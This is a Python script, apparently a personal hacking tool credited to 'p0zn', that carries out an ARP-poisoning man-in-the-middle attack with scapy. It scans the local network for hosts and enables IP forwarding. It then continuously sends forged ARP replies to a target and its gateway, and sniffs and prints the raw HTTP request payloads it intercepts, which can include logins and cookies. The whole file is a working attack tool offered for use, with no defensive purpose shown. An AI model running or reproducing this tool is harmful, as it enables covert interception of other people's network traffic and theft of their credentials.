import platform
import threading
import time
import scapy.all as scapy
import optparse
from scapy_http import http
from threading import Thread
import itertools
import subprocess
import os
import socket
import struct
import readline

print(r"""         _           _            _                 _          
        /\ \       / /\         /\ \               /\ \     _  
       /  \ \     / /  \       /  \ \             /  \ \   /\_\
      / /\ \ \   / / /\ \   __/ /\ \ \           / /\ \ \_/ / /
     / / /\ \_\ / / /\ \ \ /___/ /\ \ \         / / /\ \___/ / 
    / / /_/ / //_/ /  \ \ \\___\/ / / /        / / /  \/____/  
   / / /__\/ / \ \ \   \ \ \     / / /        / / /    / / /   
  / / /_____/   \ \ \   \ \ \   / / /    _   / / /    / / /    
 / / /           \ \ \___\ \ \  \ \ \__/\_\ / / /    / / /     
/ / /             \ \/____\ \ \  \ \___\/ // / /    / / /      
\/_/               \_________\/   \/___/_/ \/_/     \/_/            
""")
print("\n*************************************************************")
print("\n* Copyright of p0zn, 2021                                   *")
print("\n* Follow me on Github:/p0zn                                 *")
print("\n* Follow me on Linkedin :/p0zn                              *")
print("\n*************************************************************")


def ip_forward():
    os_name = platform.system()
    print(f"\nYour OS is {os_name}.\n")
    print("[0]Default option for your OS\n[1]Linux\n[2]Ubuntu\n[3]Mac\n")
    user_option = input("Choose option for ip forwarding. (Press enter for default option = [0]) : ") or "0"
    if user_option == "0":
        if "Linux" in os_name:
            subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            print(f"\n -IP forwarding done! for {os_name}\n")
        if "Ubuntu" in os_name:
            subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            print(f"\n -IP forwarding done! for {os_name}\n")
        if "Mac" in os_name:
            subprocess.call("sysctl -w net.inet.ip.forwarding=1", shell=True)
            print(f"\n -IP forwarding done! for {os_name}\n")

    if user_option == "1":
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f"\n -IP forwarding done! for {os_name}\n")
    if user_option == "2":
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f"\n -IP forwarding done! for {os_name}\n")
    if user_option == "3":
        subprocess.call("sysctl -w net.inet.ip.forwarding=1", shell=True)
        print(f"\n -IP forwarding done! for {os_name}\n")


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i", "--interface", dest="interface", help="Enter interface to listen (wlan0/eth0)")

    options = parse_object.parse_args()[0]

    if not options.interface:
        print("Please enter a valid interface or check --help command!")
        exit()

    return options


def network_scan(ip):
    print("\nNetwork Scanner Starting...\n")
    time.sleep(1)
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1)[0]
    answered_list.summary()
    print("\n -Network Scanning Done!\n")
    time.sleep(1)


def get_mac_address(ip):
    arp_request_package = scapy.ARP(pdst=ip)
    broadcast_package = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_package = broadcast_package/arp_request_package
    answered_list = scapy.srp(combined_package, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, poisoning_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc = poisoning_ip)
    scapy.send(arp_response, verbose=False)


def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=gateway_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False)


def listen_packages(interface):
    scapy.sniff(iface=interface, store=False, prn=analyze_packages)


def analyze_packages(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)


def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            default_gateway_ip = (socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))))
            return default_gateway_ip


user_interface = get_user_input()
selected_interface = user_interface.interface

if selected_interface == "wlan0":
    subprocess.call("ifconfig eth0 down", shell=True)
    print(f"\nSelected interface : {selected_interface}")
else:
    print(f"Selected interface : {selected_interface}")


print("\nDo you want a start network scanner? (Press enter for default option = [0])\n\n[0]Start network scanner.\n[1]Continue without scan.\n")
network_user_option = input("\nOption is : ") or "0"
if network_user_option == "0":
    print("\nEnter a gateway IP address for scanning.\n")
    network_scanner = input(f"Gateway IP (Default = {get_default_gateway_linux()}/[IP range options: 8/16/24]: ")
    network_scan(network_scanner)
elif network_user_option == "1":
    pass
else:
    print("Enter a valid option!")

print("\nARP operation starting..")
time.sleep(1)
get_target_ip = input("\n-Enter target IP for ARP operation: ")
get_gateway_ip = input(f"\n-Enter gateway IP address (Press enter for default = {get_default_gateway_linux()}) : ") or get_default_gateway_linux()

print("\nStarting IP Forwarding Options...")
time.sleep(2)
print("\nDo you want to do automatic IP forwarding? (Press enter for default option = [0])\n\n[0]Do automatic IP forwarding.\n[1]Continue with default settings.")
user_ipForward_option = input("\nOption is : ") or "0"
if user_ipForward_option == "0":
    ip_forward()
elif user_ipForward_option == "1":
    pass
else:
    print("Enter a valid option")

user_target_ip = get_target_ip
user_gateway_ip = get_gateway_ip


class packageSender(threading.Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()

    def run(self):
        while True:
            arp_poisoning(user_target_ip, user_gateway_ip)
            arp_poisoning(user_gateway_ip, user_target_ip)
            for package_counter in itertools.count(start=2, step=2):
                print("\rSending Packages.. " + str(package_counter) + " packages sent.", end="")
                time.sleep(2)


class packageListener(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()

    def run(self):
        while True:
            print("Listener Started!")
            print("----------------------------p0zn's 👁 Eye--------------------------------\n")
            listen_packages(selected_interface)


if __name__ == '__main__':
    send = packageSender()
    listen = packageListener()
    package_send = Thread(target=send.run)
    package_listen = Thread(target=listen.run)

try:
    while True:
        pass

except KeyboardInterrupt:
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
    if selected_interface == "wlan0":
        subprocess.call("sudo ifconfig eth0 up", shell=True)
        print("\nStopping ARP Operation and resetting settings to default.")
        exit()
    else:
        print("\nStopping ARP Operation and resetting settings to default.")
        exit()